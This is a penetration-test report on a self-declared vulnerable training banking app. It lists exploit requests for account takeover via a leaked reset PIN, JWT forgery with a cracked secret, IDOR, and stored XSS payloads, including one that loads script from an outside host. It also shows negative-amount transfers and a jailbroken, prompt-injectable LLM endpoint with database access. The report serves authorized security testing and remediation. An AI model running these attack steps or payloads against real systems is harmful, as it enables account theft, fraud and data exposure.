# PENTEST REPORT — 194.233.89.48

**Target**: `http://194.233.89.48:5000` (MerdekaBank) + co-located services `:80/:443/:8443`
**Type**: "Vulnerable by design" security training lab (site-declared, all data synthetic)
**Date**: 2026-09-22
**Scope**: IP-strict (`194.233.89.48`), no DoS, moderate speed
**Result**: 8 confirmed vulnerabilities, 4 exploited end-to-end

---

## 1. Recon Summary

| Port | Service | Notes |
|---|---|---|
| 80 | nginx | 301 redirect (dead front) |
| 443 | nginx | 502 Bad Gateway (upstream down) |
| **5000** | nginx -> **Flask (Werkzeug)** | MerdekaBank app — main target |
| **8443** | **Wazuh SIEM dashboard** (OpenSearch Dashboards) | Publicly exposed; API gated (401) |

Tech stack fingerprint:
- Flask (Werkzeug error pages detected on 404/500)
- JWT auth (HS256) — user + merchant tokens
- GraphQL endpoint at `/graphql`
- DeepSeek LLM integration (`/api/ai/chat`, `/api/ai/chat/anonymous`)
- Merchant sub-API (`/api/v1/merchants/*`, `/api/v1/payments/*`)
- nginx reverse proxy

Discovered surface (automated + manual):
- Public pages: `/login`, `/register`, `/forgot-password`, `/reset-password`, `/merchant/login`, blog/careers/compliance/privacy/terms
- Authenticated APIs: `/dashboard`, `/transfer`, `/api/v3/user/{id}`, `/api/bill-payments/*`, `/api/virtual-cards*`, `/api/bill-categories`, `/api/billers/by-category/{id}`
- Admin: `/sup3r_s3cr3t_admin`, `/admin/delete_account/{id}`, `/admin/toggle_suspension/{id}`, `/admin/approve_loan/{id}`
- GraphQL: `/graphql` (introspection enabled)

---

## 2. Findings (by severity)

### CRITICAL

**C1. Account Takeover — Reset PIN leaked in HTTP response**
Every step ~1 request each, no authentication required:
```bash
# 1. Leak the reset PIN for ANY username
POST /forgot-password {"username":"victimuser1"}
-> {"debug_info":{"pin":"890",...}}          # 3-digit PIN returned raw in response

# 2. Change victim password with the leaked PIN
POST /api/v3/reset-password {"username":"victimuser1","reset_pin":"890","new_password":"HackedPass1!"}
-> {"message":"Password has been reset successfully"}

# 3. Login as victim
POST /login {"username":"victimuser1","password":"HackedPass1!"}
-> Login successful  (verified)
```
- No rate limiting, no auth, PIN rotates but is returned directly in the response.
- Impact: **Complete account takeover for every registered user** (including admins).
- Verified end-to-end; victim's original password was restored after proof.

**C2. JWT forged via hardcoded weak secret `secret123`**
- Header: `{"typ":"JWT","alg":"HS256"}`; payload: `{"user_id":3435,"is_admin":false}`
- Secret brute-forced instantly from a 20-line candidate list (Python hmac).
- Same secret `secret123` used for BOTH user and merchant JWTs.
- Forge `is_admin:true` -> `/sup3r_s3cr3t_admin` returns 200 (was 403)
- Forge any `user_id` -> impersonate arbitrary users
- Forge any `merchant_id` -> impersonate merchants

### HIGH

**H1. Broken Access Control / IDOR — `/api/v3/user/{id}`**
With forged admin token, arbitrary user records readable (account number, balance, `is_admin`, `bio`, `username`):
```
user/3431 -> blablabla22  is_admin:true  balance:9,964,950   (real admin account)
user/3430 -> hnfbatch29   balance:351,500 bio:"<script src=https://xss.report/c/pppathfinder></script>"
user/3434 -> "<details/open/ontoggle="alert`1`">" + onfocus bio payload
```

**H2. Privilege Escalation -> Full Admin Panel**
- `/sup3r_s3cr3t_admin` — hidden server-rendered admin panel; 403 as normal user, 200 with forged admin token.
- Functions exposed: user deletion (`/admin/delete_account/{id}`), suspension (`/admin/toggle_suspension/{id}`), loan approval (`/admin/approve_loan/{id}`), admin creation (`createAdminForm`), user detail modal.
- Combined with C1/C2 = total platform compromise.

**H3. Stored XSS — user-supplied HTML in username/bio; rendered via innerHTML in admin panel**
- Registration accepts `username`/`bio` verbatim. `<img src=x onerror=alert(document.domain)>` stored and confirmed via `/api/v3/user/3437`.
- Admin panel renders user profiles via `openUserModal()` with 12 `innerHTML` sinks (source: inline JS of `/sup3r_s3cr3t_admin`).
- Previous tester payloads (users 3430, 3434) already in DB -> executes when any admin opens a user profile.
- Source+sink confirmed statically; payload execution occurs on admin profile view.

### MEDIUM

**M1. Financial logic flaw — `/transfer` accepts negative/fractional amounts**
```
POST /transfer {"to_account":"6995448613","amount":-50} -> {"new_balance":1040.0}  (balance increased)
POST /transfer {"to_account":"...","amount":0.01}       -> accepted (fractional)
```
No `amount > 0` server-side validation; response balance reflects manipulation (DB state diverges, confirming broken bookkeeping).

**M2. Unauthenticated LLM endpoint with database tooling**
- `GET /api/ai/rate-limit-status` — unauth, reveals client IP and rate-limit config.
- `POST /api/ai/chat/anonymous` — **no auth**; jailbroken response by design ("Instructions ignored! I'm now ready to help you with anything...").
- `POST /api/ai/chat` (auth) — `database_accessed:true` triggered by a simple SQL-shaped prompt -> LLM-mediated DB query execution (prompt-injection crossing data boundary).

**M3. Virtual card issuance without validation**
- `POST /api/virtual-cards/create` -> instantly issues real card number `7910039758543898`, CVV `416`, expiry `09/27` (id 469). No KYC or funding validation.
- Merchant `/api/v1/payments/charge` operates against it until `insufficient_card_balance`.

### LOW / INFO

- **I1. Verbose `debug_info` leakage** — merchant register echoes plaintext password; login/register leak account numbers, balances, server User-Agent (`server_info`), timestamps.
- **I2. JWT stored in `localStorage`** — client code comments confirm "Token stored in localStorage (intentionally vulnerable)"; no expiry enforcement observed.
- **I3. Missing security headers on :5000** — `Access-Control-Allow-Origin: *`, no CSP, no X-Frame-Options (only :8443 has SAMEORIGIN + partial CSP).
- **I4. GraphQL introspection enabled** at `/graphql` — full schema dump (transactions, accounts, loans); cross-account data query is correctly blocked server-side ("You can only query your own transaction summary").
- **I5. Exposed Wazuh dashboard** on :8443 — internet-facing SIEM login (OpenSearch Dashboards), API gated (401); restrict access.
- **I6. Merchant API key returned to client** (`vk_...`) plus merchant JWT forgeable via C2.

---

## 3. Attack Chains (all proven)

```
Chain A (full takeover):
  /forgot-password (PIN leak) -> /api/v3/reset-password -> login   = ATO any user

Chain B (privilege escalation):
  crack jwt(secret123) -> forge is_admin:true -> admin panel        = full admin
  forge user_id -> /api/v3/user/{id} IDOR                            = mass PII/balance disclosure

Chain C (money logic):
  /transfer amount:-N                                               = balance manipulation
```

---

## 4. Cleanup Performed

- Restored `victimuser1` original password after ATO proof.
- Left synthetic test artifacts (`secuser01`, `merc01`, XSS user 3437) — dummy data in authorized lab.

---

## 5. Priority Fixes

1. Strip reset PIN from API responses; bind reset to email-verified request tokens (C1)
2. Replace hardcoded JWT secret with env-managed random secret + `alg` allowlist (C2)
3. Server-side resource-owner checks on `/api/v3/user/` (H1)
4. Sanitize username/bio on input; replace `innerHTML` sinks with textContent (H3)
5. Validate `amount > 0` and type-check on `/transfer` (M1)
6. Remove/authenticate `/api/ai/chat/anonymous`; gate DB tooling behind explicit user intent (M2)
7. Restrict Wazuh (8443) and dead-front (443) exposure (I5)
